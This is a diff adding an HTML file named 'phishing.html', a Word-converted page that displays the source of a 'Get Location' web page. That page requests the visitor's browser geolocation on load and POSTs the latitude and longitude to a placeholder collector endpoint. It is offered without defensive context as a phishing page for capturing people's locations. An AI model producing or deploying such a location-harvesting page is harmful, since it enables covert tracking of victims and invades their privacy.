@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <title>phishing.html</title>
+  <style>
+  /* Font Definitions */
+  @font-face
+        {font-family:"Cambria Math";
+        panose-1:2 4 5 3 5 4 6 3 2 4;}
+  /* Style Definitions */
+  p.MsoNormal, li.MsoNormal, div.MsoNormal
+        {margin-top:0in;
+        margin-right:0in;
+        margin-bottom:.45pt;
+        margin-left:.5pt;
+        text-indent:-.5pt;
+        line-height:111%;
+        font-size:11.0pt;
+        font-family:"Arial",sans-serif;
+        color:black;}
+  .MsoChpDefault
+        {font-size:12.0pt;}
+  .MsoPapDefault
+        {margin-bottom:8.0pt;
+        line-height:115%;}
+  @page WordSection1
+        {size:8.5in 11.0in;
+        margin:1.0in 91.15pt 1.0in 1.0in;}
+  div.WordSection1
+        {page:WordSection1;}
+  @media (max-width: 900px) { 
+  img { 
+   max-width: 100%;
+   height: auto;
+  }
+
+  .table-container {
+    overflow-x: auto;
+    -webkit-overflow-scrolling: touch;
+  }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+  }
+
+  td, th {
+    padding: 8px;
+    text-align: left;
+    border: 1px solid #ddd;
+  }
+  }       
+
+
+  </style>
+</head>
+<body lang="EN-US" style='word-wrap:break-word'>
+  <div class="WordSection1">
+    <p class="MsoNormal" style='margin-left:-.25pt'>&lt;!DOCTYPE html&gt;</p>
+    <p class="MsoNormal" style='margin-left:-.25pt'>&lt; html&gt;</p>
+    <p class="MsoNormal" style='margin-left:-.25pt'>&nbsp;&lt;head&gt;</p>
+    <p class="MsoNormal" style='margin-left:-.25pt'>&nbsp;&nbsp;&nbsp; &lt;title&gt;Get Location&lt;/title&gt;</p>
+    <p class="MsoNormal" style='margin-top:0in;margin-right:126.85pt;margin-bottom: .45pt;margin-left:-.25pt'>&nbsp;&nbsp;&nbsp; &lt;script&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; function getLocation() {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (navigator.geolocation) {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; navigator.geolocation.getCurrentPosition(showPosition);</p>
+    <p class="MsoNormal" style='margin-left:-.25pt'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } else {</p>
+    <p class="MsoNormal" style='margin-left:-.25pt'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; document.getElementById(&quot;demo&quot;).innerHTML = &quot;Geolocation is not supported by this browser.&quot;;</p>
+    <p class="MsoNormal" style='margin-left:-.25pt'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>
+    <p class="MsoNormal" style='margin-left:-.25pt'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>
+    <p class="MsoNormal" style='margin-top:0in;margin-right:0in;margin-bottom:.9pt; margin-left:0in;text-indent:0in;line-height:107%'>&nbsp;</p>
+    <p class="MsoNormal" style='margin-top:0in;margin-right:123.05pt;margin-bottom: .45pt;margin-left:-.25pt'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; function showPosition(position) {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; var lat = position.coords.latitude;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; var lon = position.coords.longitude;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; var message = &quot;Latitude: &quot; + lat + &quot;&lt;br&gt;Longitude: &quot; + lon;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; document.getElementById(&quot;demo&quot;).innerHTML = message;</p>
+    <p class="MsoNormal" style='margin-top:0in;margin-right:144.7pt;margin-bottom: .45pt;margin-left:-.25pt'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // Send the coordinates to your server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fetch('https://your-server-endpoint.com/save-location', {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; method: 'POST',&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; headers: {</p>
+    <p class="MsoNormal" style='margin-left:-.25pt'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'Content-Type': 'application/json'</p>
+    <p class="MsoNormal" style='margin-left:-.25pt'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; },</p>
+    <p class="MsoNormal" style='margin-left:-.25pt'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; body: JSON.stringify({ latitude: lat, longitude: lon })</p>
+    <p class="MsoNormal" style='margin-left:-.25pt'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; });</p>
+    <p class="MsoNormal" style='margin-left:-.25pt'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>
+    <p class="MsoNormal" style='margin-left:-.25pt'>&nbsp;&nbsp;&nbsp; &lt;/script&gt;</p>
+    <p class="MsoNormal" style='margin-left:-.25pt'>&nbsp;&lt;/head&gt;</p>
+    <p class="MsoNormal" style='margin-left:-.25pt'>&nbsp;&lt;body onload=&quot;getLocation()&quot;&gt;</p>
+    <p class="MsoNormal" style='margin-left:-.25pt'>&nbsp;&nbsp;&nbsp; &lt;h2&gt;Getting your location...&lt;/h2&gt;</p>
+    <p class="MsoNormal" style='margin-left:-.25pt'>&nbsp;&nbsp;&nbsp; &lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;</p>
+    <p class="MsoNormal" style='margin-left:-.25pt'>&nbsp;&lt;/body&gt;</p>
+    <p class="MsoNormal" style='margin-left:-.25pt'>&nbsp;&lt;/html&gt;</p>
+  </div>
+<p style="bottom: 10px; right: 10px; position: absolute;"><a href="https://wordtohtml.net" target="_blank" style="font-size:11px; color: #d0d0d0">Converted to HTML with WordToHTML.net</a></p>
+</body>
+</html>
